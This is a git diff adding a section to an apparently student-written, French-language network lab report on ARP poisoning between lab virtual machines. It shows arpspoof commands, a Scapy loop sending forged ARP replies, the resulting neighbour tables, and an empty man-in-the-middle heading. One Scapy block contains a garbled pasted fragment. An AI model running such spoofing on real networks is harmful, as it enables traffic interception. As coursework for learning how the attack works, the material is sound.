@@ -419,3 +419,77 @@ OS and Service detection performed. Please report any incorrect results at https
 Nmap done: 1 IP address (1 host up) scanned in 4.56 seconds
 ```
 [nmap_2.pcap](/nmap_2.pcap)
+
+# Part IV : ARP Poisoning
+## 1. Simple ARP spoof
+
+🌞 Empoisonnez la table ARP de node2.tp1.my
+
+```bash	
+[toto@node1 ~]$ sudo arpspoof -i enp0s8 -t 10.1.1.12 -r 10.1.1.1
+8:0:27:be:d5:cd 8:0:27:93:2:66 0806 42: arp reply 10.1.1.1 is-at 8:0:27:be:d5:cd
+8:0:27:be:d5:cd a:0:27:0:0:7 0806 42: arp reply 10.1.1.12 is-at 8:0:27:be:d5:cd
+```
+```bash
+[toto@node2 ~]$ ip neigh show
+10.0.2.2 dev enp0s3 lladdr 52:54:00:12:35:02 STALE
+10.1.1.1 dev enp0s8 lladdr 08:00:27:be:d5:cd REACHABLE
+```
+🦈 Capture ARP Spoof
+
+[arp_spoof_1.pcap](/arp_spoof_1.pcap)
+
+## 2. Avec Scapy
+
+🌞Ecrire un script Scapy qui fait le travail de arpspoof
+
+```bash
+[toto@node1 ~]$ sudo python
+Python 3.9.21 (main, Dec  5 2024, 00:00:00)
+[GCC 11.5.0 20240719 (Red Hat 11.5.0-2)] on linux
+Type "help", "copyright", "credits" or "license" for more information.
+>>> from scapy.all import *
+ker_ip = "10.1.1.100"
+victim_mac = "08:00:27:93:02:66"
+while True:
+    ans, unans = sr(ARP(op=2, pdst=victim_ip, psrc=attacker_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=victim_mac))>>>
+>>> victim_ip = "10.1.1.12"
+>>> attacker_ip = "10.1.1.100"
+>>> victim_mac = "08:00:27:93:02:66"
+>>> while True:
+...     ans, unans = sr(ARP(op=2, pdst=victim_ip, psrc=attacker_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=victim_mac))
+...
+Begin emission:
+Finished sending 1 packets.
+..........
+.................
+.........
+......
+....
+....
+......................^C
+Received 72 packets, got 0 answers, remaining 1 packets
+Begin emission:
+Finished sending 1 packets.
+........^C
+Received 8 packets, got 0 answers, remaining 1 packets
+Begin emission:
+Finished sending 1 packets.
+```
+```bash
+[toto@node2 ~]$ ip neigh show
+10.0.2.2 dev enp0s3 lladdr 52:54:00:12:35:02 STALE
+10.1.1.1 dev enp0s8 lladdr 0a:00:27:00:00:07 DELAY
+10.1.1.100 dev enp0s8 lladdr 08:00:27:93:02:66 STALE
+```
+
+[arp_spoof.py](/arp_spoof.py)
+
+🦈 Capture ARP Spoof Scapy
+
+[arp_spoof_2.pcap](/arp_spoof_2.pcap)
+
+## 3. Man in the middle
+
+🌞 Mettre en place un MITM ARP
+
